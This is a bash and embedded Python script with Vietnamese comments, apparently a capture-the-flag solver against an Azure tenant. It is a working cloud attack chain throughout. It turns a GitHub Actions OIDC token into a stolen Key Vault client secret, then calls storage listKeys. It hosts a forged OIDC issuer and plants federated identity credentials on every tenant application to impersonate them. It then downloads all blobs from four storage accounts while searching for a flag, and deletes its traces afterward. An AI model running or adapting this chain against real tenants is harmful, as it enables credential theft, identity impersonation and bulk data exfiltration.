#!/usr/bin/env bash
# v14 — mạo danh 14 app (FIC tạm) -> listKeys 4 storage account -> vét MỌI container/blob -> grep flag
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
HOST="https://$SA.z23.web.core.windows.net"
PFX="htx-$RANDOM$RANDOM"; SUBJECT="tbl-solver-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARM0=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARM0" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json
echo "[*] graph=${#G} key0=${#KEY0} prefix=$PFX"

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$RG" "$G" <<'PY'
import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt
sa,key0,host,pfx,subject,ten,sub,rg,graph = sys.argv[1:10]
ISS=f"{host}/{pfx}"
ACCOUNTS=["sttblcilogsprodx3euoz","sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]
FLAG=re.compile(rb'DF26\{[^}]*\}')

svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
web=svc.get_container_client("$web")
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
 "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)

def api(url,method="GET",tok=graph,body=None):
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=30) as f:
            t=f.read(); return json.loads(t) if t else {}
    except Exception as e:
        try: return {"error":json.loads(e.read())}
        except Exception: return {"error":str(e)[:100]}

def mint():
    n=int(time.time())
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange",
      "iat":n-60,"nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception: return ""

apps=json.load(open("/tmp/apps.json"))["value"]
created=[]
for a in apps:
    r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
          body={"name":"tmp-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
    if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
print("[*] FIC tạm:",len(created)); time.sleep(45)

keys={ "sttblcilogsprodx3euoz": key0 }
for oid,fid,appid,name in created:
    am=exchange(appid,"https://management.azure.com/.default")
    if not am: continue
    for acc in ACCOUNTS:
        if acc in keys: continue
        r=api(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{acc}/listKeys?api-version=2023-01-01","POST",tok=am,body={})
        if "error" not in r and r.get("keys"):
            keys[acc]=r["keys"][0]["value"]; print(f"  >>> {name} có key {acc}")
print("[*] account có key:",list(keys))

for acc,k in keys.items():
    print(f"================ {acc} ================")
    s=BlobServiceClient(f"https://{acc}.blob.core.windows.net",credential=k)
    try: cs=list(s.list_containers())
    except Exception as e: print("  lỗi:",str(e)[:120]); continue
    for c in cs:
        cc=s.get_container_client(c.name)
        print("  container:",c.name)
        try: bl=list(cc.list_blobs())
        except Exception as e: print("    lỗi:",str(e)[:100]); continue
        for b in bl:
            if b.name.startswith(pfx): continue
            try: data=cc.download_blob(b.name).readall()
            except Exception as e: print("    ",b.name,"dl err"); continue
            m=FLAG.findall(data)
            if m: print("    *** FLAG trong",c.name,"/",b.name,":",[x.decode() for x in m])
            elif len(data)<1200 and not b.name.endswith(('.json','jwks')):
                print("    ",b.name,b.size,data[:300])
            else:
                print("    ",b.name,b.size)

print("[*] dọn dẹp")
for oid,fid,appid,name in created:
    if fid: api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
    try: web.delete_blob(p)
    except Exception: pass
PY
echo "================ DONE ================"
